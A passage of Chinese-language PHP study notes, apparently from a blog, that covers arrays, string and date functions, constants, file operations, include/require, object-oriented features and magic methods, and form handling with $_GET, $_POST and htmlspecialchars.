二维数组<br>$arr =<span class="hljs-built_in"> array</span><br><span class="hljs-built_in"></span>(<br>    array(<span class="hljs-string">&quot;Volvo&quot;</span>,100,96),<br>    array(<span class="hljs-string">&quot;BMW&quot;</span>,60,59),<br>    array(<span class="hljs-string">&quot;Toyota&quot;</span>,110,100)<br>);<br></code></pre></td></tr></table></figure><p>关联数组：指定键</p><figure class="highlight sml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs sml">$sites = <span class="hljs-built_in">array</span><br>(<br>    <span class="hljs-string">&quot;runoob&quot;</span>=&gt;<span class="hljs-built_in">array</span><br>    (<br>        <span class="hljs-string">&quot;菜鸟教程&quot;</span>,<br>        <span class="hljs-string">&quot;http://www.runoob.com&quot;</span><br>    ),<br>    <span class="hljs-string">&quot;google&quot;</span>=&gt;<span class="hljs-built_in">array</span><br>    (<br>        <span class="hljs-string">&quot;Google 搜索&quot;</span>,<br>        <span class="hljs-string">&quot;http://www.google.com&quot;</span><br>    ),<br>    <span class="hljs-string">&quot;taobao&quot;</span>=&gt;<span class="hljs-built_in">array</span><br>    (<br>        <span class="hljs-string">&quot;淘宝&quot;</span>,<br>        <span class="hljs-string">&quot;http://www.taobao.com&quot;</span><br>    )<br>); <br></code></pre></td></tr></table></figure><h3 id="数组相关函数"><a href="#数组相关函数" class="headerlink" title="数组相关函数"></a>数组相关函数</h3><p>常用函数：</p><p><img src="/../image/%E6%95%B0%E7%BB%84%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0.png"></p><p>排序函数：</p><p><img src="/../image/%E6%95%B0%E7%BB%84%E6%8E%92%E5%BA%8F%E5%87%BD%E6%95%B0.png"></p><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="函数的定义"><a href="#函数的定义" class="headerlink" title="函数的定义"></a>函数的定义</h3><p>function 函数名(变量名)</p><p>{</p><p>​…</p><p>​return (返回值);</p><p>}</p><p>注意：如果要在函数内调用全局变量前面要加global;</p><p>例如</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-number">100</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">add</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">global</span> <span class="hljs-variable">$a</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><h3 id="常用字符串函数"><a href="#常用字符串函数" class="headerlink" title="常用字符串函数"></a>常用字符串函数</h3><p>trim()删除字符串两端的空格和其他预定义字符(比如\r,\n)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">a = <span class="hljs-string">&quot;  nailong  &quot;</span>;<br><span class="hljs-variable">$a</span> = trim(<span class="hljs-variable">$a</span>);<br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$a</span>;<br></code></pre></td></tr></table></figure><p>dirname()返回路径中的目录部分</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-keyword">__FILE__</span>.<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>; <span class="hljs-comment">// __FILE__代表当前文件的绝对路径</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-keyword">__FILE__</span>).<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br><span class="hljs-comment">// 返回值：</span><br><span class="hljs-comment">// E:\CTF\newphp\字符串常用函数.php</span><br><span class="hljs-comment">// E:\CTF\newphp</span><br></code></pre></td></tr></table></figure><p>strlen()获取字符串的长度</p><p>strpos()函数用于在字符串内查找一个字符或指定文本</p><p>htmlspecialchars()预定义字符转html实体编码，只格式化&amp;,’,”,&lt;,&gt;这几个特殊符号</p><p>substr()截取字符串</p><p>其他常用字符串函数：</p><p><img src="/../image/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0.png"></p><h2 id="时间日期函数"><a href="#时间日期函数" class="headerlink" title="时间日期函数"></a>时间日期函数</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// 格式化时间日期函数</span><br><span class="hljs-variable">$d</span> = <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&#x27;Y/m/d h:i:s&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$d</span>.<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br><br><span class="hljs-comment">// time()时间戳函数</span><br><span class="hljs-variable">$t</span> = <span class="hljs-title function_ invoke__">time</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$t</span>.<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br><br><span class="hljs-comment">// getdate() 当前时间的一个数组表示</span><br><span class="hljs-variable">$k</span> = <span class="hljs-title function_ invoke__">getdate</span>();<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$k</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$k</span>[<span class="hljs-number">0</span>].<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>; <span class="hljs-comment">// 取时间戳</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$k</span>[<span class="hljs-string">&#x27;hours&#x27;</span>].<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br><br><br><span class="hljs-title function_ invoke__">date_format</span>()将日期时间对象转换为字符串<br><br>strtotime（<span class="hljs-keyword">string</span>类型），可以把<span class="hljs-keyword">string</span>类型转换成时间戳<br><br><span class="hljs-title function_ invoke__">date_create</span>()来创建一个日期时间对象<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h2><h3 id="定义常量"><a href="#定义常量" class="headerlink" title="定义常量"></a>定义常量</h3><p>方式1：define(‘常量名’,’常量’);</p><p>方式2：const 常量名 &#x3D; 常量值;</p><p>区别：</p><p>1.define定义的常量名可以是特殊符号，若是特殊符号，则需要用echo constant（’ 常量名’）来打印；const 不能用特殊符号；</p><p>2.const不能用于if判断中</p><p>3.const用于类成员变量的定义，define不可用</p><h3 id="预定义常量"><a href="#预定义常量" class="headerlink" title="预定义常量"></a>预定义常量</h3><p>系统自带的常量，可直接使用</p><p><code>PHP_VERSION</code>：当前 PHP 解析器的版本。</p><p><code>PHP_OS</code>：服务器的操作系统。</p><p><code>PHP_INT_MAX</code>：最大的整数值。</p><p><code>E_ERROR</code>、<code>E_WARNING</code>、<code>E_PARSE</code> 等：错误报告级别</p><h3 id="魔术常量"><a href="#魔术常量" class="headerlink" title="魔术常量"></a>魔术常量</h3><p>魔术常量值随着它们在代码中的位置改变而改变</p><p>双下划线+常量名+双下划线</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-emphasis">__LINE__</span>文件中的当前行号<br><span class="hljs-emphasis">__FILE__</span>文件的完整路径和文件名<br><span class="hljs-emphasis">__DIR__</span>文件所在的目录<br><span class="hljs-emphasis">__FUNCTION__</span>返回该函数被定义时的名字<br><span class="hljs-emphasis">__CLASS__</span>返回该类被定义时的名<br><span class="hljs-emphasis">__TRAIT__</span>Trait 的名字<br><span class="hljs-emphasis">__METHOD__</span>返回该方法被定义时的名字（区分大小写）<br><span class="hljs-emphasis">__NAMESPACE__</span>当前命名空间的名称（区分大小写）<br></code></pre></td></tr></table></figure><h2 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h2><h3 id="文件和目录操作"><a href="#文件和目录操作" class="headerlink" title="文件和目录操作"></a>文件和目录操作</h3><p>文件写入：</p><p>file_put_contents(文件名)<br>如果找不到该文件，会自动创建，先清空再写入内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$a</span> = file_put_contents(<span class="hljs-string">&#x27;1.txt&#x27;</span>, <span class="hljs-string">&#x27;Hello&#x27;</span>);<br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$a</span>.<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br></code></pre></td></tr></table></figure><p>文件读取：</p><p>readfile(文件名);读取文件中的内容打印出来 返回值为文件内容的长度</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$a</span> = readfile(<span class="hljs-string">&#x27;1.txt&#x27;</span>);<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>.<span class="hljs-variable">$a</span>;<br></code></pre></td></tr></table></figure><p>file_get_contents()读取文件内容 &#x2F;&#x2F; 绝对路径 相对路径 网址路径</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$a</span> = file_get_contents(<span class="hljs-string">&#x27;1.txt&#x27;</span>);<br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$a</span>.<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br></code></pre></td></tr></table></figure><p>fopen()打开文件</p><p>fwrite()写入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$a</span> = fopen(<span class="hljs-string">&#x27;1.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>);<br><span class="hljs-built_in">echo</span> gettype(<span class="hljs-variable">$a</span>).<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br></code></pre></td></tr></table></figure><p>fread()读取文件</p><p>fgets()读取一行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$b</span> = fread(<span class="hljs-variable">$a</span>,3);<br><br><span class="hljs-variable">$b</span> = fgets(<span class="hljs-variable">$a</span>);<br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$b</span>.<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br></code></pre></td></tr></table></figure><h3 id="文件模式"><a href="#文件模式" class="headerlink" title="文件模式"></a>文件模式</h3><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs mel"><span class="hljs-comment">// r+读写模式</span><br>$a = <span class="hljs-keyword">fopen</span>(<span class="hljs-string">&#x27;1.txt&#x27;</span>,<span class="hljs-string">&#x27;r+&#x27;</span>);<br>$b = <span class="hljs-keyword">fwrite</span>($a,<span class="hljs-string">&#x27;aaa&#x27;</span>); <span class="hljs-comment">// 返回写入长度 覆盖原内容</span><br>echo $b.<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br><span class="hljs-keyword">fclose</span>($a);<br><br><span class="hljs-comment">// w和w+模式都会先将文件清空</span><br><br><span class="hljs-comment">// a模式 追加模式 不会覆盖原内容</span><br></code></pre></td></tr></table></figure><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>include函数和require函数</p><p>include(‘文件名’)：</p><p>返回一个警告<br>如果引入出错，代码继续向下执行，通常用于动态包含<br>include(‘…’);</p><p>require(‘文件名’)：</p><p>如果引入出错，代码就不会继续向下执行<br>require(‘include等文件包含函数.php’);</p><p>include_once函数引入 除了原有功能还会once检测，如果文件曾经已经被包含过，不再包含</p><p>推荐使用require</p><h2 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h2><p>具体资料<a href="https://www.runoob.com/php/php-oop.html">https://www.runoob.com/php/php-oop.html</a></p><h3 id="类"><a href="#类" class="headerlink" title="类"></a>类</h3><p>定义了一件事物的抽象特点。</p><p>类的定义包含了数据的形式以及对数据的操作。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Fruit</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$color</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">set_name</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_name</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;name;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">say</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;name.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="创建对象"><a href="#创建对象" class="headerlink" title="创建对象"></a>创建对象</h3><p>类创建后，我们可以使用 <strong>new</strong> 运算符来实例化该类的对象</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cos"><span class="hljs-built_in">$apple</span> = <span class="hljs-keyword">new</span> Fruit()<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><h3 id="调用成员方法"><a href="#调用成员方法" class="headerlink" title="调用成员方法"></a>调用成员方法</h3><p>在实例化对象后，我们可以使用该对象调用成员方法，该对象的成员方法只能操作该对象的成员变量</p><p>$对象名-&gt;方法名(参数)</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xl">$<span class="hljs-function"><span class="hljs-title">apple</span>-&gt;</span>set_name(<span class="hljs-string">&quot;Apple&quot;</span>);<br>$<span class="hljs-function"><span class="hljs-title">banana</span>-&gt;</span>set_name(<span class="hljs-string">&quot;Banana&quot;</span>);<br>$<span class="hljs-function"><span class="hljs-title">apple</span>-&gt;</span>say();<br></code></pre></td></tr></table></figure><h3 id="类的方法和属性"><a href="#类的方法和属性" class="headerlink" title="类的方法和属性"></a>类的方法和属性</h3><p>如果想要调用或者对类的成员变量进行赋值需要用$this-&gt;变量名</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl">$<span class="hljs-function"><span class="hljs-title">this</span>-&gt;</span><span class="hljs-keyword">name</span> = $<span class="hljs-keyword">name</span>;<br></code></pre></td></tr></table></figure><h3 id="访问控制"><a href="#访问控制" class="headerlink" title="访问控制"></a>访问控制</h3><p>PHP 对属性或方法的访问控制，是通过在前面添加关键字 public（公有），protected（受保护）或 private（私有）来实现的。</p><ul><li><strong>public（公有）：</strong>公有的类成员可以在任何地方被访问。</li><li><strong>protected（受保护）：</strong>受保护的类成员则可以被其自身以及其子类和父类访问。</li><li><strong>private（私有）：</strong>私有的类成员则只能被其定义所在的类访问。</li></ul><h3 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h3><p>构造函数和析构函数</p><p>__construct()类构造函数</p><ol><li>在创建一个新对象是，他会自动调用</li><li>他可以用来初始化对象的属性或执行的其他必要的操作</li><li>没有返回值</li></ol><p>例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>=<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$age</span>=<span class="hljs-number">1</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    person::<span class="hljs-variable">$sum</span>++;<br>    <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>    <span class="hljs-variable language_">$this</span>-&gt;age = <span class="hljs-variable">$age</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>__destruct()类的析构函数 不能加上任何参数</p><p>1.在对象销毁时会自动调用</p><p>2.可以用来执行一些清理操作，例如释放资源或关闭数据库连接</p><p>3当对象不在被引用或脚本执行结束前，析构函数会被自动调用</p><hr><p>其他魔术方法：</p><p>__call()在对象中调用一个不可访问方法时调用</p><p>当调用一个不可访问方法或者不存在的方法时会执行__call()方法</p><hr><p>__callstatic()静态调用</p><p>调用时格式：对象名::方法名(参数)</p><hr><p>__unset()方法和 unset函数 ：当对不可访问属性调用unset()时被调用</p><p>可在对象外面删除对象的属性</p><p>例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unset</span>(<span class="hljs-params"><span class="hljs-variable">$content</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>     <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;当测定私有成员<span class="hljs-subst">&#123;$content&#125;</span>时,自动调用&quot;</span>.<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">unset</span>(<span class="hljs-variable">$c</span>-&gt;name); <span class="hljs-comment">// 删除c对象中的私有变量name</span><br><span class="hljs-variable">$c</span>-&gt;<span class="hljs-title function_ invoke__">say</span>();<br></code></pre></td></tr></table></figure><hr><p>__tostring()方法调用后可直接echo输出对象</p><p>例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;这个人的名字叫<span class="hljs-subst">&#123;$this-&gt;name&#125;</span>.年龄为<span class="hljs-subst">&#123;$this-&gt;age&#125;</span>.&lt;br&gt;&quot;</span>;<br>&#125;<br><span class="hljs-variable">$d</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">personchild</span>(<span class="hljs-string">&quot;奶龙&quot;</span>,<span class="hljs-number">100</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$d</span>;<br></code></pre></td></tr></table></figure><hr><p>__set()方法可给私有属性赋值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$PName</span>, <span class="hljs-variable">$Value</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$PName</span> = <span class="hljs-variable">$Value</span>;<br>&#125;<br><span class="hljs-variable">$a</span>-&gt;name = <span class="hljs-string">&quot;小红&quot;</span>; <span class="hljs-comment">// 给私有属性赋值</span><br><span class="hljs-variable">$a</span>-&gt;age = <span class="hljs-number">16</span>;<br></code></pre></td></tr></table></figure><hr><p>__clone方法和clone关键字用来复制对象产生一个副本</p><p>如果只需要直接复制就不需要再类中定义clone方法</p><p>如果在clone时需要重新赋初值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__clone</span>(<span class="hljs-params"></span>)//定义<span class="hljs-title">__clone</span>方法</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;调用__clone方法&quot;</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    <span class="hljs-variable language_">$this</span>-&gt;age = -<span class="hljs-number">100</span>;<br>    <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-string">&quot;吴颖昇&quot;</span>;<br>&#125;<br><span class="hljs-variable">$e</span> = <span class="hljs-keyword">clone</span> <span class="hljs-variable">$d</span>;<span class="hljs-comment">//调用clone方法复制对象</span><br></code></pre></td></tr></table></figure><hr><p>__get()方法可获取私有属性</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$PName</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$PName</span>==<span class="hljs-string">&quot;age&quot;</span>)<br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;age;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;name;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">person</span>(<span class="hljs-string">&quot;小明&quot;</span>,<span class="hljs-number">60</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;姓名&quot;</span>.<span class="hljs-variable">$a</span>-&gt;name.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>; <span class="hljs-comment">// 直接访问私有属性name 自动调用__get方法可以间接获取</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;年龄&quot;</span>.<span class="hljs-variable">$a</span>-&gt;age.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>; <span class="hljs-comment">// 直接调用__get方法 根据对象本身的情况返回不同的值</span><br></code></pre></td></tr></table></figure><h3 id="static静态变量和self"><a href="#static静态变量和self" class="headerlink" title="static静态变量和self"></a>static静态变量和self</h3><p>定义：public static $变量名</p><p>调用：self::变量名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-variable">$gender</span>;<br><span class="hljs-built_in">self</span>::<span class="hljs-variable">$gender</span> = <span class="hljs-string">&#x27;male&#x27;</span>;<br></code></pre></td></tr></table></figure><hr><p>类常量</p><p>用const去定义常量，调用方式和static类似，用self调用，唯一区别是类常量不可修改</p><hr><p>static静态方法定义：</p><p><img src="/../image/%E9%9D%99%E6%80%81%E6%96%B9%E6%B3%95.png"></p><p>调用静态方法:</p><p><img src="/../image/%E9%9D%99%E6%80%81%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8.png"></p><h3 id="类的继承"><a href="#类的继承" class="headerlink" title="类的继承"></a>类的继承</h3><p>PHP中使用关键字<strong>extends</strong>来继承一个类,且PHP不支持多继承</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs scala"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Child</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Parent</span> </span><br>&#123;<br>   <span class="hljs-comment">// 代码部分</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="类的方法重写和属性改写"><a href="#类的方法重写和属性改写" class="headerlink" title="类的方法重写和属性改写"></a>类的方法重写和属性改写</h3><p>方法重写 (就是改写父类覆盖)<br>如果从父类继承的方法不能满足子类的需求，可以对其进行改写<br>这个过程叫方法的覆盖（override），也称为方法的重写。</p><p>直接在子类内部改写方法或属性。</p><p>final关键字（在不想被改写的类或类的方法前加final）</p><ul><li>防止类被改写</li><li>防止类的方法被重写。</li></ul><p><strong>final不能用于属性</strong></p><hr><p>调用父类中被重写的方法</p><p>parent关键字<br>parent::方法();</p><h2 id="网络请求"><a href="#网络请求" class="headerlink" title="网络请求"></a>网络请求</h2><h3 id="POST和GET"><a href="#POST和GET" class="headerlink" title="POST和GET"></a>POST和GET</h3><p>$_GET 变量：</p><p>预定义的 $_GET 变量用于收集来自 method&#x3D;”get” 的表单中的值。</p><p>从带有 GET 方法的表单发送的信息，对任何人都是可见的（会显示在浏览器的地址栏），并且对发送信息的量也有限制。</p><hr><p>$_POST 变量：</p><p>预定义的 $_POST 变量用于收集来自 method&#x3D;”post” 的表单中的值。</p><p>从带有 POST 方法的表单发送的信息，对任何人都是不可见的（不会显示在浏览器的地址栏），并且对发送信息的量也没有限制。</p><hr><p>$<em>SERVER[“PHP_SELF”] 变量</em></p><p>_$_SERVER[“PHP_SELF”]是超级全局变量，返回当前正在执行脚本的文件名，与 document root相关。</p><p>所以， $_SERVER[“PHP_SELF”] 会发送表单数据到当前页面，而不是跳转到不同的页面</p><hr><p>$_REQUEST变量包含了$_GET，$__POST和$_COOKLE的内容</p><p>htmlspecialchars()方法  </p><p>htmlspecialchars() 函数把一些预定义的字符转换为 HTML 实体。以避免在HTML文档中引起解析错误或安全漏洞</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml">&amp; （和号） 成为 <span class="hljs-symbol">&amp;amp;</span><br>&quot; （双引号） 成为 <span class="hljs-symbol">&amp;quot;</span><br>&#x27; （单引号） 成为 <span class="hljs-symbol">&amp;#039;</span><br>&lt; （小于） 成为 <span class="hljs-symbol">&amp;lt;</span><br>&gt; （大于） 成为 <span class="hljs-symbol">&amp;gt;</span><br></code></pre></td></tr></table></figure>]]></content>
      
